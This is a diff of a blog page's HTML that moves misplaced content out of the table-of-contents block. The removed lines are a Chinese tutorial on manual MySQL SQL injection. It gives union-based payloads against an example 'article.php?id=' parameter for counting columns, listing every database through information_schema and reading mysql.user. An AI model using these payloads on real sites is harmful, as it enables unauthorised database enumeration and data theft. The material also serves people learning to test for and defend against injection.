@@ -123,45 +123,7 @@
     <div class="post-toc">
       <span class="post-toc-title">文章目录</span>
         <div class="post-toc-content">
-          <p>本文将记录MySQL数据库手工注入的基础以及一些技巧</p>
-<a id="more"></a>
-
-<h2 id="手工注入探测"><a href="#手工注入探测" class="headerlink" title="手工注入探测"></a>手工注入探测</h2><ul>
-<li>####判断是否存在注入</li>
-</ul>
-<p><code>article.php?id=1&#39;</code> 报错</p>
-<p><code>article.php?id=1 and 1=1</code> 正常</p>
-<p><code>article.php?id=1 and 1=2</code> 报错</p>
-<ul>
-<li>####判断字段数</li>
-</ul>
-<p><code>article.php?id=1 order by 1</code></p>
-<p><code>article.php?id=1 order by 2</code></p>
-<p><code>article.php?id=1 order by 3</code></p>
-<p><code>article.php?id=1 order by 4</code> 报错</p>
-<p>存在4个字段</p>
-<ul>
-<li>####联合查询 1,2,3字段</li>
-</ul>
-<p><code>article.php?id=1 union select 1,2,3</code></p>
-<p><img src="/uploads/2019/03/1503278801.png" alt="1.png"></p>
-<p>找到在页面中显示的字段内容后</p>
-<p><code>article.php?id=1 union select 1,database(),version()</code></p>
-<p>在显示字段的地方加入想要查询的信息</p>
-<p><img src="/uploads/2019/03/3754273547.png" alt="2.png"></p>
-<ul>
-<li>####查找其他数据库</li>
-</ul>
-<p>使用MySQL分组合并查询</p>
-<p><code>article.php?id=1 union select 1,group_concat(schema_name),3 from information_schema.schemata</code></p>
-<p><img src="/uploads/2019/03/3264643273.png" alt="4.png"></p>
-<p>这样就查询到MySQL里的所有数据库名称</p>
-<ul>
-<li>####查询其他数据库信息</li>
-</ul>
-<p><code>article.php?id=1 union select 1,group_concat(host),3 from mysql.user</code></p>
-<p><img src="/uploads/2019/03/1042527104.png" alt="3.png"></p>
-
+          <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#手工注入探测"><span class="toc-text">手工注入探测</span></a></li></ol>
         </div>
     </div>
 </div>
